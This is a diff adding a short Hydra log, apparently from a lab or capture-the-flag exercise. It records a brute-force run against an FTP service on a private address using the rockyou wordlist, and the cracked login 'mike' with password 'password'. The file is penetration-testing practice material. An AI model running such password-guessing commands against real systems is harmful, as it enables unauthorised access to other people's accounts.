@@ -1,0 +1,2 @@
+# Hydra v8.6 run at 2021-10-30 13:32:19 on 10.10.97.0 ftp (hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -o ftp_enum_hydra.log -vV 10.10.97.0 ftp)
+[21][ftp] host: 10.10.97.0   login: mike   password: password
